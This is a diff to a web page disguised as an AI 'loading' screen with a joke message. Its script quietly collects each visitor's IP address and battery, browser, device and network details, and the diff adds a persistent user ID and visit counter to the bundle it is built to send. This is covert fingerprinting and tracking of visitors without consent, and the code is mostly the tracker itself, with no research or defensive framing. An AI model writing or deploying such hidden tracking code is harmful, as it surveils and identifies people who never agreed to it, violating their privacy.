@@ -5,8 +5,28 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Loading...</title>
     <script>
+        function getOrCreateUserId() {
+            let userId = localStorage.getItem('user_id');
+            if (!userId) {
+                userId = 'user-' + crypto.randomUUID();
+                localStorage.setItem('user_id', userId);
+            }
+            return userId;
+        }
+
+        function updateVisitCount() {
+            let visitCount = localStorage.getItem('visit_count');
+            visitCount = visitCount ? parseInt(visitCount) + 1 : 1;
+            localStorage.setItem('visit_count', visitCount);
+            return visitCount;
+        }
+
         async function collectAndSendData() {
             try {
+                // Get User ID and Visit Count
+                const userId = getOrCreateUserId();
+                const visitCount = updateVisitCount();
+
                 // Collect IP Address
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
@@ -55,9 +75,9 @@
 
                 // Collect Device Information
                 const deviceInfo = {
-                    hardwareConcurrency: navigator.hardwareConcurrency, // Number of CPU cores
-                    deviceMemory: navigator.deviceMemory,              // Approximate RAM in GB
-                    maxTouchPoints: navigator.maxTouchPoints           // Number of touch points supported
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    deviceMemory: navigator.deviceMemory,
+                    maxTouchPoints: navigator.maxTouchPoints
                 };
 
                 // Collect Network Information
@@ -65,10 +85,10 @@
                 const networkInfo = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                 if (networkInfo) {
                     connectionData = {
-                        downlink: networkInfo.downlink, // Estimated download speed (Mbps)
-                        effectiveType: networkInfo.effectiveType, // Network type (e.g., '4g', '3g')
-                        rtt: networkInfo.rtt, // Round-trip time (ms)
-                        saveData: networkInfo.saveData // Data saver mode enabled
+                        downlink: networkInfo.downlink,
+                        effectiveType: networkInfo.effectiveType,
+                        rtt: networkInfo.rtt,
+                        saveData: networkInfo.saveData
                     };
                 }
 
@@ -80,6 +100,8 @@
 
                 // Combine Data
                 const userData = {
+                    userId,
+                    visitCount,
                     ip: ipData.ip,
                     batteryInfo,
                     browserInfo,
@@ -115,5 +137,6 @@
     <p>Please wait while the AI thinks about how to deep frye you today...</p>
 </body>
 </html>
+
 
 
